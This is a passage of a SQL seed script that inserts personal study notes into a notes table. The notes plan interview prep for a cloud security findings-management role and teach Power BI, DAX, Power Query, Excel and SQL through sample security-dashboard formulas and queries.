- Risk prioritization via "toxic combinations"

**⚠️ Gap:** You haven't studied the **Wiz console UI** specifically. Key Wiz concepts to learn:
- **Wiz Issues** = their version of findings/IOMs
- **Wiz Controls** = specific compliance checks
- **Wiz Rules** = custom detection policies
- **CCR (Cloud Configuration Review)** = Wiz's compliance scanning module
- **Wiz Attack Paths** = graph-based lateral movement visualization
- **Wiz Inventory** = asset graph with relationships

---

### ⚠️ 5. "Splunk — manage security findings and alerts"

**Partially covered:**

| What You Learned | Where |
|-----------------|-------|
| CNAPP → SIEM integration architecture | `EY_Prep.md` Section 8 |
| SIEM correlation rules (CSPM + GuardDuty → P1 escalation) | `Ultimate_Prep_Part2.md` Q17 |
| Falcon Insight query syntax (event_simpleName, CommandLine) | `Ultimate_Prep_Part2.md` Section 9 |

**⚠️ Gap:** You need Splunk-specific skills:
- SPL (Search Processing Language) for log queries
- Splunk dashboards for security KPIs
- Alert configuration and notable events
- CIM (Common Information Model) for data normalization
- Correlation searches and data models

---

### ✅ 6. "SLA tracking reviews, escalations with application teams"

**Well covered from EY prep:**

| What You Learned | Where |
|-----------------|-------|
| SLA framework with tiered severity | `Ultimate_Prep_Part1.md` Section 3.5 |
| Automated SLA escalation engine (Python script) | `Automation_Scripts.md` Script 5 |
| Stakeholder communication (business impact first) | `EY_Prep.md` Section 10, `Part2` Q22 |
| Weekly security office hours concept | `EY_Prep.md` Section 10 |
| Handling pushback from developers | `Ultimate_Prep_Part2.md` Q23 |
| Risk acceptance when you disagree | `Ultimate_Prep_Part2.md` Q24 |
| 30-60-90 day plan structure | `Ultimate_Prep_Part2.md` Q25, `EY_Prep.md` Section 15 |

---

### ✅ 7. "REST APIs and JSON-based datasets for reporting"

**Partially covered through automation scripts:**

| What You Learned | Where |
|-----------------|-------|
| Falcon API authentication (OAuth2 token) | `Automation_Scripts.md` Script 1 |
| AWS Boto3 API calls (EC2, S3, IAM, SecurityHub) | `Automation_Scripts.md` Scripts 1-6 |
| JSON data processing in Python | All automation scripts |
| API-driven alert enrichment | `EY_Prep.md` Section 8 |

---

### ✅ 8. "SOPs, KB articles, remediation guides, documentation"

**Covered conceptually, not as a dedicated skill:**

| What You Learned | Where |
|-----------------|-------|
| Remediation steps for every misconfiguration | `Ultimate_Prep_Part1.md` Section 3.8 (all 10 PSS misconfigs) |
| Runbook updates as post-incident activity | `Ultimate_Prep_Part1.md` Section 3.4 Phase 6 |
| 30-60-90 day plan includes "Document all processes" | `EY_Prep.md` Section 15 |

---

## SECTION 2: WHAT YOU NEED TO LEARN — THE GAPS

### ❌ GAP 1: Power BI / DAX / Power Query (CRITICAL — Required Qualification)

**Why Wells Fargo needs this:** They track cloud security KPIs via Power BI dashboards. The FM team builds datasets from Wiz APIs, CSVs, and databases to create executive reports.

**What to learn:**
```
POWER BI LEARNING PATH:
├── 1. Power BI Desktop basics (drag-and-drop reports, visuals)
├── 2. Power Query (M-language) — connect to CSV, API, database
│   ├── Data cleaning: remove nulls, split columns, merge queries
│   ├── Data shaping: pivot/unpivot, group by, add custom columns
│   └── Incremental refresh for large datasets
├── 3. DAX (Data Analysis Expressions)
│   ├── Measures: CALCULATE, FILTER, SUMX, COUNTROWS
│   ├── Time intelligence: DATEADD, TOTALYTD, SAMEPERIODLASTYEAR
│   ├── Context: row context vs filter context
│   └── KPI measures: SLA compliance %, MTTR, finding age distribution
├── 4. Data modeling
│   ├── Star schema (fact tables + dimension tables)
│   ├── Relationships (one-to-many, many-to-many)
│   └── Role-level security (RLS) for team-specific views
└── 5. Security-specific dashboards
    ├── Finding count by severity over time
    ├── SLA compliance by team / cloud account
    ├── MTTR trends
    ├── Compliance score by framework
    └── Coverage gaps by region / account
```

**Sample DAX you should know:**
```
SLA_Compliance_Rate =
DIVIDE(
    COUNTROWS(FILTER(Findings, Findings[SLA_Status] = "On Track")),
    COUNTROWS(Findings),
    0
) * 100

Open_Critical_Findings =
CALCULATE(
    COUNTROWS(Findings),
    Findings[Severity] = "CRITICAL",
    Findings[Status] = "Open"
)

MTTR_Days =
AVERAGEX(
    FILTER(Findings, Findings[Status] = "Closed"),
    DATEDIFF(Findings[Created_Date], Findings[Closed_Date], DAY)
)
```

---

### ❌ GAP 2: Excel Advanced (Required Qualification)

**What to learn:**
```
EXCEL SKILLS NEEDED:
├── VLOOKUP / XLOOKUP — match findings to asset owners by asset ID
├── INDEX-MATCH — flexible lookup across large datasets
├── PivotTables — summarize findings by severity, team, cloud account
├── Power Query in Excel — same transformations as Power BI
├── Conditional Formatting — heatmaps for SLA status
└── Data Validation — dropdown lists for triage status updates
```

**Example use case:** You receive a CSV with 5,000 Wiz findings. You need to:
1. XLOOKUP the asset owner from a CMDB export
2. PivotTable to show finding count by severity × team
3. Conditional formatting to highlight SLA-breached items in red
4. Power Query to merge with last month's data for trend analysis

---

### ❌ GAP 3: ServiceNow (CMDB, Workflows, Ticket Management)

**What to learn:**
```
SERVICENOW SKILLS NEEDED:
├── CMDB (Configuration Management Database)
│   ├── What it stores: all IT assets with owners, environments, relationships
│   ├── CI (Configuration Item) validation: is the asset in CMDB?
│   ├── Ownership mapping: which team owns this resource?
│   └── CMDB hygiene: stale CIs, missing owners, orphaned assets
├── Incident / Change Management
│   ├── Ticket creation from security findings
│   ├── Assignment groups and routing logic
│   ├── SLA timers and escalation rules
│   └── Change request processing for remediation
├── Workflows
│   ├── Automated ticket routing based on asset tags / cloud account
│   ├── Approval workflows for risk acceptance
│   └── Auto-closure when CNAPP confirms remediation
└── Reporting
    ├── ServiceNow dashboards for security metrics
    ├── CMDB coverage reports
    └── SLA compliance tracking
```

---

### ❌ GAP 4: SQL Queries for Dashboards

**What to learn:**
```sql
-- Example: Finding count by severity and cloud account
SELECT severity, cloud_account, COUNT(*) as finding_count
FROM wiz_findings
WHERE status = 'Open'
GROUP BY severity, cloud_account
ORDER BY 
  CASE severity WHEN 'CRITICAL' THEN 1 WHEN 'HIGH' THEN 2 
       WHEN 'MEDIUM' THEN 3 ELSE 4 END;

-- Example: SLA compliance by team
SELECT team, 
  COUNT(*) as total,
  SUM(CASE WHEN sla_status = 'On Track' THEN 1 ELSE 0 END) as on_track,
  ROUND(SUM(CASE WHEN sla_status = 'On Track' THEN 1 ELSE 0 END) * 100.0 
        / COUNT(*), 1) as compliance_pct
FROM findings
GROUP BY team
ORDER BY compliance_pct ASC;

-- Example: MTTR by severity
SELECT severity,
  AVG(DATEDIFF(day, created_date, closed_date)) as avg_mttr_days,
  MAX(DATEDIFF(day, created_date, closed_date)) as max_mttr_days
FROM findings WHERE status = 'Closed'
GROUP BY severity;
```

---

### ⚠️ GAP 5: Azure & GCP Specific Knowledge (Deeper Needed)

**What you know (from existing materials):**
- Multi-cloud controls matrix (high-level comparison)
- Azure NSG audit script (PowerShell)
- Azure Policy / GCP Organization Policy concepts
- Azure Key Vault / GCP Cloud KMS mentioned

**What you need to deepen:**

| Azure | GCP |
|-------|-----|
| Defender for Cloud (CSPM equivalent) | Security Command Center (SCC) |
| Entra ID (IAM, PIM, Conditional Access) | IAM, Workload Identity, IAM Recommender |
| NSGs + ASGs + Azure Firewall | Firewall Rules + VPCSC |
| Storage Account security (SAS tokens, private endpoints) | Cloud Storage (uniform bucket, signed URLs) |
| Azure Policy + Blueprints | Organization Policies + Assured Workloads |
| AKS security (pod identity, workload identity) | GKE security (Workload Identity, Binary Auth) |
| Key Vault (CMK, access policies, RBAC) | Cloud KMS (CMEK, key rotation) |
| Azure Resource Graph queries | Asset Inventory API |
| Management Groups hierarchy | Organization → Folders → Projects hierarchy |

---

## SECTION 3: YOUR COMPETITIVE ADVANTAGE — What Makes You Strong for This Role

Despite the gaps above, here's what makes you **very strong** for this role:

```
YOUR STRENGTHS FOR WELLS FARGO:

1. FINDINGS MANAGEMENT EXPERTISE     ← This IS the role
   • Full TP/FP investigation framework
   • Risk acceptance process with governance
   • Suppression management with accountability
   • SLA tracking and escalation automation
   
2. CSPM/CWPP DEEP KNOWLEDGE          ← Technical core
   • 20 incident scenarios with investigation steps
   • 10 PSS misconfigurations with remediation
   • CIS/NIST compliance mapping (control-level)
   • Detection types, severity, and TP rates
   
3. AUTOMATION MINDSET                 ← They want this
   • 6 Python automation scripts ready to discuss
   • API integration experience (Falcon, AWS)
   • Event-driven remediation architecture
   • Auto-escalation engine for SLAs
   
4. STAKEHOLDER MANAGEMENT            ← FM team is customer-facing
   • Business-impact-first communication style
   • Developer pushback handling
   • Office hours concept
   • Risk acceptance governance
   
5. VULNERABILITY MANAGEMENT          ← Core responsibility
   • Complete 6-phase lifecycle
   • Context-based prioritization (not just CVSS)
   • Attack path analysis for finding correlation
   • Build-breaking policies
```

---

## SECTION 4: STUDY PLAN — Priority Order for Wells Fargo Prep

```
WEEK 1 (HIGHEST PRIORITY):
├── ⬜ Power BI basics — install Desktop, build first dashboard from CSV
├── ⬜ DAX fundamentals — CALCULATE, COUNTROWS, DIVIDE, time intelligence
├── ⬜ Power Query — connect to CSV, clean data, merge queries
└── ⬜ Build a sample "Security Findings Dashboard" in Power BI

WEEK 2:
├── ⬜ Excel advanced — XLOOKUP, INDEX-MATCH, PivotTables, conditional formatting
├── ⬜ SQL fundamentals — SELECT, JOIN, GROUP BY, aggregation, subqueries
├── ⬜ Practice: take a sample findings CSV → Excel analysis → Power BI dashboard
└── ⬜ Wiz platform — watch YouTube demos, read Wiz docs (Issues, Controls, CCR)

WEEK 3:
├── ⬜ ServiceNow fundamentals — CMDB concepts, ticket lifecycle, assignment groups
├── ⬜ Azure security deep dive — Defender for Cloud, Entra ID, NSGs, Storage
├── ⬜ GCP security deep dive — SCC, IAM, Firewall Rules, Cloud KMS
└── ⬜ Splunk SPL basics — search, stats, timechart, eval, lookup

WEEK 4 (REVIEW):
├── ⬜ Re-read Ultimate_Prep_Part1 (Sections 2, 3 — platform workflows)
├── ⬜ Re-read Ultimate_Prep_Part2 (Section 5 TP/FP, Section 6 CIS/NIST)
├── ⬜ Practice interview Q&A — all 25 questions from Part2 Section 8
├── ⬜ Build a 30-60-90 day plan specifically for Wells Fargo FM role
└── ⬜ Prepare 2-3 STAR stories focused on findings management
```

---

## SECTION 5: FILES YOU CREATED — Quick Reference

| File | Key Content for This Role |
|------|--------------------------|
| `Ultimate_Interview_Prep_Part1.md` | Platform workflows, CSPM/CWPP investigation, IR lifecycle, 20 scenarios, PSS misconfigs |
| `Ultimate_Interview_Prep_Part2.md` | TP/FP framework, CIS/NIST compliance, 25 interview Q&As, SLA framework |
| `EY_Cloud_Security_Interview_Prep.md` | Multi-cloud IAM, vuln management lifecycle, SIEM integration, stakeholder mgmt |
| `Cloud_Security_Automation_Scripts.md` | 6 Python scripts — coverage reconciliation, PSS scanner, auto-remediation, SLA tracker |
| `Advanced_Cloud_Security_Study_Guide.md` | AWS attack scenarios, detection engineering, CloudTrail analysis |
| `CNAPP_Structured_Guide.md` | Sensor deployment, KAC architecture, runtime security principles |
| `KAC_and_Runtime_Detections_Guide.md` | 15 runtime detection scenarios, KAC policy types |
| `Cloud_Security_Complete_Playbook.md` | K8s breach simulation, MITRE ATT&CK mapping, SOC checklist |
| `cloud_security_interview_guide.md` | 15 attack scenarios, EKS security, command references |

---

> **Bottom Line:** You have ~70% of the technical security knowledge this role needs. The **big gaps are tooling-specific**: Power BI, Excel advanced, ServiceNow, and SQL. These are learnable in 2-3 weeks of focused study. Your CSPM/CWPP findings management knowledge is your strongest differentiator — that's the actual job.$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$WF_Gap_Notes_Part1_PowerBI_Excel$VELSEC$, $VELSEC$Wf Gap Notes Part1 Powerbi Excel$VELSEC$, $VELSEC$Career Development$VELSEC$, ARRAY['Interview_Preparation']::TEXT[], $VELSEC$# 📊 GAP LEARNING NOTES — Part 1: Power BI, DAX, Power Query & Excel Advanced

> **For:** Wells Fargo Senior Info Security Analyst — CWLS Findings Management
> **Why:** Required qualification — build dashboards and reports for cloud security KPIs

---

# SECTION 1: POWER BI FUNDAMENTALS

## 1.1 What Is Power BI and Why Wells Fargo Uses It

```
POWER BI ARCHITECTURE:

Data Sources                Power BI Desktop           Power BI Service (Cloud)
┌──────────┐              ┌──────────────────┐        ┌──────────────────┐
│ CSV files │──┐           │                  │        │                  │
│ (Wiz export)│ │          │  Power Query     │        │  Dashboards      │
├──────────┤  │  ┌────┐   │  (ETL = Extract, │  ──►  │  Shared Reports  │
│ SQL DB    │──┼─►│ PBI│──►│   Transform,     │        │  Scheduled       │
│ (findings)│  │  │ Des│   │   Load)          │        │   Refresh        │
├──────────┤  │  │ ktop│   │                  │        │  Row-Level       │
│ REST APIs │──┤  └────┘   │  Data Model      │        │   Security       │
│ (Wiz API) │  │           │  (Relationships) │        │                  │
├──────────┤  │           │                  │        │  Mobile App      │
│ ServiceNow│──┘           │  DAX Measures     │        │                  │
│ (tickets) │              │  (Calculations)  │        │                  │
└──────────┘              │                  │        │                  │
                           │  Visualizations   │        │                  │
                           └──────────────────┘        └──────────────────┘
```

**Wells Fargo FM Team uses Power BI to:**
- Track open findings by severity, team, cloud account, and age
- Monitor SLA compliance rates across all teams
- Show MTTR (Mean Time to Remediate) trends
- Compliance dashboard (CIS/NIST pass rates over time)
- Coverage dashboards (% of assets scanned)
- Executive reports for CISO and governance

## 1.2 Power BI Desktop — Core Concepts

### The Three Layers

| Layer | What It Does | Where In Power BI |
|-------|-------------|-------------------|
| **Power Query (M)** | Extract, transform, load data from sources | "Transform Data" button |
| **Data Model** | Define table relationships, create calculated columns | "Model" view |
| **DAX Measures** | Create dynamic calculations for reports | "Modeling" tab → New Measure |

### Building Your First Security Dashboard — Step by Step

```
Step 1: GET DATA
├── File → Get Data → CSV (import Wiz findings export)
├── Or: Get Data → Web → enter Wiz API endpoint
├── Or: Get Data → SQL Server → enter connection string
└── Power Query Editor opens → you see raw data

Step 2: TRANSFORM DATA (Power Query)
├── Remove unnecessary columns (click column header → Remove)
├── Change data types (Date columns → Date type)
├── Filter rows (remove test/dev-only findings if needed)
├── Add custom columns (e.g., SLA_Status based on age + severity)
├── Merge Queries (join findings with CMDB data to get owners)
└── Click "Close & Apply" → data loads into model

Step 3: BUILD DATA MODEL
├── Go to Model View
├── Create relationships between tables
│   ├── Findings[asset_id] → CMDB[asset_id]  (many-to-one)
│   ├── Findings[team_id] → Teams[team_id]    (many-to-one)
│   └── Findings[date] → Calendar[date]       (many-to-one)
└── This enables cross-table filtering in reports

Step 4: CREATE DAX MEASURES
├── (See Section 2 below for all measures)

Step 5: BUILD VISUALIZATIONS
├── Drag fields onto canvas
├── Choose visual type (bar chart, card, table, matrix)
├── Add slicers for filtering (severity, team, date range)
└── Format → make it look professional
```

---

# SECTION 2: DAX — The Formula Language for Power BI

## 2.1 DAX Basics — Think of It Like Excel Formulas for Databases

| Concept | Excel Equivalent | DAX |
|---------|-----------------|-----|
| Simple count | `=COUNTA(A:A)` | `COUNTROWS(Findings)` |
| Conditional count | `=COUNTIFS(A:A,"CRITICAL")` | `CALCULATE(COUNTROWS(Findings), Findings[Severity]="CRITICAL")` |
| Sum | `=SUM(A:A)` | `SUM(Findings[RiskScore])` |
| Average | `=AVERAGE(A:A)` | `AVERAGE(Findings[Age_Days])` |
| Percentage | `=A1/B1*100` | `DIVIDE([On_Track], [Total], 0) * 100` |

## 2.2 Essential DAX for Security Dashboards

### Finding Counts

```dax
// Total open findings
Total_Open_Findings =
COUNTROWS(
    FILTER(Findings, Findings[Status] = "Open")
)

// Critical open findings
Critical_Open =
CALCULATE(
    COUNTROWS(Findings),
    Findings[Severity] = "CRITICAL",
    Findings[Status] = "Open"
)

// High open findings
High_Open =
CALCULATE(
    COUNTROWS(Findings),
    Findings[Severity] = "HIGH",
    Findings[Status] = "Open"
)

// Findings by cloud provider
Azure_Findings =
CALCULATE(COUNTROWS(Findings), Findings[Cloud] = "Azure")

GCP_Findings =
CALCULATE(COUNTROWS(Findings), Findings[Cloud] = "GCP")
```

### SLA Compliance

```dax
// SLA compliance rate (% of findings within SLA)
SLA_Compliance_Rate =
DIVIDE(
    CALCULATE(COUNTROWS(Findings), Findings[SLA_Status] = "On Track"),
    COUNTROWS(Findings),
    0
) * 100

// SLA breached count
SLA_Breached =
CALCULATE(
    COUNTROWS(Findings),
    Findings[SLA_Status] = "Breached",
    Findings[Status] = "Open"
)

// SLA compliance by severity (use with matrix visual)
SLA_Compliance_By_Severity =
VAR _total = COUNTROWS(Findings)
VAR _ontrack = CALCULATE(COUNTROWS(Findings), Findings[SLA_Status] = "On Track")
RETURN DIVIDE(_ontrack, _total, 0) * 100
```

### MTTR (Mean Time to Remediate)

```dax
// Average MTTR in days (for closed findings only)
MTTR_Days =
AVERAGEX(
    FILTER(Findings, Findings[Status] = "Closed"),
    DATEDIFF(Findings[Created_Date], Findings[Closed_Date], DAY)
)

// MTTR for Critical findings only
MTTR_Critical =
AVERAGEX(
    FILTER(Findings,
        Findings[Status] = "Closed" && Findings[Severity] = "CRITICAL"
    ),
    DATEDIFF(Findings[Created_Date], Findings[Closed_Date], DAY)
)
```

### Time Intelligence (Trends Over Time)

```dax
// Findings closed this month
Closed_This_Month =
CALCULATE(
    COUNTROWS(Findings),
    Findings[Status] = "Closed",
    DATESMTD(Findings[Closed_Date])
)

// Findings opened vs closed comparison
Net_Change =
[Opened_This_Month] - [Closed_This_Month]

// Month-over-month change
MoM_Change =
VAR _current = [Total_Open_Findings]
VAR _previous = CALCULATE([Total_Open_Findings], DATEADD(Calendar[Date], -1, MONTH))
RETURN DIVIDE(_current - _previous, _previous, 0) * 100
```

### Compliance Score

```dax
// CIS compliance percentage
CIS_Compliance_Pct =
DIVIDE(
    CALCULATE(COUNTROWS(Controls), Controls[Status] = "Pass"),
    COUNTROWS(Controls),
    0
) * 100

// Compliance trend (used with line chart over time)
Compliance_Score_Over_Time =
CALCULATE(
    [CIS_Compliance_Pct],
    FILTER(ALL(Calendar), Calendar[Date] <= MAX(Calendar[Date]))
)
```

## 2.3 Key DAX Functions to Memorize

| Function | What It Does | Example |
|----------|-------------|---------|
| `CALCULATE` | Changes filter context — THE most important function | `CALCULATE(COUNTROWS(T), T[Col]="X")` |
| `COUNTROWS` | Counts rows in a table | `COUNTROWS(Findings)` |
| `FILTER` | Returns a filtered table | `FILTER(Findings, Findings[Age]>90)` |
| `DIVIDE` | Safe division (handles divide by zero) | `DIVIDE(10, 0, 0)` → returns 0 |
| `SUMX` | Iterates and sums | `SUMX(Findings, Findings[Score])` |
| `AVERAGEX` | Iterates and averages | `AVERAGEX(T, DATEDIFF(...))` |
| `DATEDIFF` | Date difference | `DATEDIFF(Start, End, DAY)` |
| `DATESMTD` | Month-to-date filter | `DATESMTD(Calendar[Date])` |
| `ALL` | Removes all filters | `CALCULATE(COUNT, ALL(Findings))` |
| `VAR / RETURN` | Variables for readability | `VAR x = 10 RETURN x * 2` |

---

# SECTION 3: POWER QUERY (M-Language) — Data Transformation

## 3.1 What Power Query Does

Power Query is the **ETL engine** — it connects to data sources, cleans/transforms the data, and loads it into the model. You use it before DAX.

## 3.2 Common Transformations for Security Data

### Connecting to a CSV (Wiz Findings Export)

```
1. Get Data → Text/CSV → select file
2. Power Query Editor opens
3. Apply transformations:
```

### Key Operations

| Operation | What It Does | How (UI) | M-Language |
|-----------|-------------|----------|------------|
| Remove columns | Drop unnecessary columns | Right-click → Remove | `Table.RemoveColumns(Source, {"Col1"})` |
| Filter rows | Keep only relevant rows | Click dropdown → filter | `Table.SelectRows(Source, each [Status] <> "Closed")` |
| Change type | Set correct data types | Click column header icon | `Table.TransformColumnTypes(Source, {{"Date", type date}})` |
| Add custom column | Calculate new values | Add Column → Custom | `Table.AddColumn(Source, "Age", each Duration.Days(DateTime.LocalNow() - [Created]))` |
| Merge queries | JOIN two tables | Home → Merge Queries | `Table.NestedJoin(Findings, "AssetID", CMDB, "AssetID", "CMDB", JoinKind.LeftOuter)` |
| Group by | Aggregate data | Transform → Group By | `Table.Group(Source, {"Team"}, {{"Count", each Table.RowCount(_)}})` |
| Unpivot | Wide → tall format | Transform → Unpivot | `Table.UnpivotOtherColumns(Source, {"ID"}, "Attribute", "Value")` |
| Replace values | Fix data quality | Transform → Replace | `Table.ReplaceValue(Source, "HIGH", "High", Replacer.ReplaceText, {"Severity"})` |

### Example: Adding SLA Status Column

```m
// Add column that calculates SLA status based on severity and age
Table.AddColumn(Source, "SLA_Status", each
    let
        age = Duration.Days(DateTime.LocalNow() - [Created_Date]),
        sla = if [Severity] = "CRITICAL" then 1
              else if [Severity] = "HIGH" then 7
              else if [Severity] = "MEDIUM" then 30
              else 90
    in
        if age > sla then "Breached"
        else if age > sla * 0.75 then "At Risk"
        else "On Track"
)
```

### Example: Merging Findings with CMDB Owner Data

```
1. Load Findings CSV (table 1)
2. Load CMDB export (table 2)
3. Home → Merge Queries
4. Select: Findings[resource_id] = CMDB[ci_id]
5. Join Kind: Left Outer (keep all findings, add CMDB columns where matched)
6. Expand the merged column → select "Owner", "Team", "Environment"
7. Now every finding has an owner!
```

### Incremental Refresh (For Large Datasets)

```
WHY: Wiz may have millions of historical findings — you don't want to reload ALL data daily

HOW:
1. Create parameters: RangeStart and RangeEnd (type DateTime)
2. Filter your query: [Created_Date] >= RangeStart AND [Created_Date] < RangeEnd
3. In Power BI Service: Set incremental refresh policy
   - Store data for last 3 years
   - Refresh data for last 7 days
   - Result: only 7 days of data refreshed daily, not the entire dataset
```

---

# SECTION 4: EXCEL ADVANCED — For Security Data Analysis

## 4.1 XLOOKUP (Replaces VLOOKUP)

**Use case:** Match finding asset IDs to CMDB owners

```excel
// Syntax: =XLOOKUP(lookup_value, lookup_array, return_array, [if_not_found])

// Find the owner for an asset ID
=XLOOKUP(A2, CMDB!$A:$A, CMDB!$D:$D, "UNASSIGNED")

// A2 = asset ID in findings sheet
// CMDB!$A:$A = asset IDs in CMDB sheet
// CMDB!$D:$D = owner names in CMDB sheet
// "UNASSIGNED" = returned if no match found
```

**Why XLOOKUP > VLOOKUP:**
- Can look LEFT (VLOOKUP can only look right)
- Has a default "not found" value
- Exact match by default (VLOOKUP defaults to approximate)
- Can return multiple columns

## 4.2 INDEX-MATCH (Most Flexible Lookup)

```excel
// Syntax: =INDEX(return_range, MATCH(lookup_value, lookup_range, 0))

// Find team name for a given asset ID
=INDEX(CMDB!$E:$E, MATCH(A2, CMDB!$A:$A, 0))

// Multi-criteria match (find owner where BOTH asset_id AND cloud match)
=INDEX(CMDB!$D:$D, MATCH(A2&B2, CMDB!$A:$A&CMDB!$B:$B, 0))
// ↑ Enter with Ctrl+Shift+Enter (array formula)
```

## 4.3 PivotTables — Summarize Findings Instantly

```
HOW TO CREATE:
1. Select your findings data (including headers)
2. Insert → PivotTable → New Worksheet
3. Drag fields:
   ├── ROWS:    Severity
   ├── COLUMNS: Cloud_Provider (Azure, GCP)
   ├── VALUES:  Count of Finding_ID
   └── FILTERS: Status (set to "Open" only)

RESULT:
              | Azure | GCP  | Total
──────────────┼───────┼──────┼──────
CRITICAL      |   23  |  11  |   34
HIGH          |  147  |  89  |  236
MEDIUM        |  412  | 201  |  613
LOW           |  156  |  78  |  234
──────────────┼───────┼──────┼──────
Total         |  738  | 379  | 1117

COMMON PIVOTS FOR SECURITY:
├── Findings by Severity × Team → shows which teams have most debt
├── Findings by Age Bucket × Severity → shows SLA compliance
├── Closed findings by Month → shows remediation velocity
├── Findings by CIS Control → shows which controls fail most
└── Findings by Cloud Account × Type → shows hotspot accounts
```

## 4.4 Conditional Formatting — Visual SLA Tracking

```
USE CASE: Color-code findings by SLA status

HOW:
1. Select the SLA_Status column
2. Home → Conditional Formatting → Highlight Cell Rules

RULES:
├── Text = "Breached"  → Red fill, white text
├── Text = "At Risk"   → Yellow fill, black text
├── Text = "On Track"  → Green fill, white text
└── Text = "UNASSIGNED" → Gray fill, italic text

USE CASE 2: Heatmap for finding age
1. Select the Age_Days column
2. Conditional Formatting → Color Scales
3. Minimum (green) = 0, Maximum (red) = 90
```

## 4.5 Power Query in Excel (Same as Power BI!)

```
Data → Get Data → From File → From CSV
├── Same Power Query editor as Power BI
├── Same M-language transformations
├── Same merge queries capability
└── Output goes to Excel worksheet instead of Power BI model

WHY USE IT:
├── When you need a quick one-time analysis
├── When sharing with teams that don't have Power BI
├── When preparing data for audit (auditors prefer Excel)
└── When building ad-hoc reports before creating a full PBI dashboard
```

## 4.6 Key Excel Formulas for Security Analysis

```excel
// Count findings by severity
=COUNTIFS(Findings!$D:$D, "CRITICAL", Findings!$G:$G, "Open")

// Average age of open Critical findings
=AVERAGEIFS(Findings!$H:$H, Findings!$D:$D, "CRITICAL", Findings!$G:$G, "Open")

// SLA compliance rate
=COUNTIFS(Findings!$I:$I, "On Track") / COUNTA(Findings!$I:$I) * 100

// Days until SLA breach
=IF(H2="CRITICAL", 1-A2, IF(H2="HIGH", 7-A2, IF(H2="MEDIUM", 30-A2, 90-A2)))

// Dynamic severity label with emoji (for formatted reports)
=IF(D2="CRITICAL", "🔴 CRITICAL", IF(D2="HIGH", "🟠 HIGH", IF(D2="MEDIUM", "🟡 MEDIUM", "🟢 LOW")))
```

---

# SECTION 5: SAMPLE SECURITY DASHBOARD LAYOUT

```
┌──────────────────────────────────────────────────────────────────────┐
│              CLOUD SECURITY FINDINGS MANAGEMENT DASHBOARD            │
│                                                                      │
│  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────────────┐│
│  │  TOTAL  │  │CRITICAL│  │  HIGH  │  │  SLA   │  │   MTTR (Days)  ││
│  │  1,247  │  │   34   │  │  236   │  │ 89.2%  │  │   Crit: 2.1    ││
│  │  Open   │  │  🔴    │  │  🟠   │  │Comply  │  │   High: 5.4    ││
│  └────────┘  └────────┘  └────────┘  └────────┘  └────────────────┘│
│                                                                      │
│  ┌─────────────────────────────────┐ ┌──────────────────────────────┐│
│  │ FINDINGS TREND (Line Chart)     │ │ BY SEVERITY (Donut Chart)    ││
│  │                                 │ │                              ││
│  │ Open ───────╲                   │ │     ┌──┐                     ││
│  │              ╲___               │ │   ┌─┤CR├─┐   CRITICAL: 3%   ││
│  │ Closed ──────╱   ╲__            │ │   │ └──┘ │   HIGH: 21%      ││
│  │             ╱        ╲          │ │   │      │   MEDIUM: 55%    ││
│  │ Jan  Feb  Mar  Apr  May         │ │   └──────┘   LOW: 21%       ││
│  └─────────────────────────────────┘ └──────────────────────────────┘│
│                                                                      │
│  ┌─────────────────────────────────┐ ┌──────────────────────────────┐│
│  │ SLA COMPLIANCE BY TEAM (Bar)    │ │ TOP 10 OVERDUE FINDINGS      ││
│  │                                 │ │ (Table)                      ││
│  │ Platform ████████████ 96%       │ │                              ││
│  │ AppDev   ████████░░░░ 78%       │ │ ID | Severity | Age | Team  ││
│  │ DataEng  ██████░░░░░░ 65%       │ │ ---|----------|-----|-----  ││
│  │ Network  ████████████ 94%       │ │ 47 | CRITICAL | 12d | Data ││
│  │ Identity ██████████░░ 88%       │ │ 23 | HIGH     | 34d | App  ││
│  └─────────────────────────────────┘ └──────────────────────────────┘│
│                                                                      │
│  [Slicer: Cloud Provider]  [Slicer: Date Range]  [Slicer: Team]    │
└──────────────────────────────────────────────────────────────────────┘
```

---

> **Interview Tip:** "I build Power BI dashboards that answer three questions: **What's our current risk posture?** (finding counts by severity), **Are we improving?** (MTTR trends, SLA compliance), and **Who needs help?** (team-level breakdown with SLA status). The dashboard drives our weekly remediation meetings — every team sees their own findings and SLA status."

---

*Continue to Part 2 → ServiceNow, SQL, Splunk SPL*
*Continue to Part 3 → Azure & GCP Deep Dive, Wiz Platform*$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

COMMIT;
